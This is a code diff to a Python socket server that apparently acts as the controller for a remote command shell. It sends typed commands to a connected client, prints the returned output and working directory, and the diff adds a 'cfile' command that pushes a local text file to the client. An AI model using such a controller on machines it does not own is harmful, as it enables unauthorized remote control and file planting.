@@ -21,8 +21,13 @@ class Server:
         self.conn, self.addr = s.accept()
         print("* SERVER STARTED *")
         self.cwd = self.conn.recv(1024).decode()
-
-
+    def filecreate(self):
+        print("file creating started")
+        filename = open("tomhanks.txt","r")
+        data = filename.read()
+        self.conn.send('tomhanks.txt'.encode("utf-8"))
+        self.conn.send(data.encode('utf-8'))
+        print("file created")
     async def communication(self):
         with self.conn:
             print('Connected by', self.addr)
@@ -33,21 +38,16 @@ class Server:
                 self.conn.send(self.command.encode())
                 if self.command.lower() == "exit":
                     break
+                if self.command.lower() == "cfile":
+                    self.filecreate()
                 output = self.conn.recv(1024).decode()
                 self.results, self.cwd = output.split(SEPARATOR)
                 print(self.results)
-    async def filecreate(self):
-        self.cwd = self.conn.recv().decode()
-        filename = open("tomhanks.txt","r")
-        data = filename.read()
-        self.conn.send('tomhanks.txt'.encode("utf-8"))
-        self.conn.send(data.encode('utf-8'))
-
+    
 server = Server(HOST,PORT,SEPARATOR,s)
 async def main():
-    asyncio.gather(
+     asyncio.gather(
     server.startserver(),
     server.communication(),
-    server.filecreate(),
-    )
+     )
 asyncio.run(main())
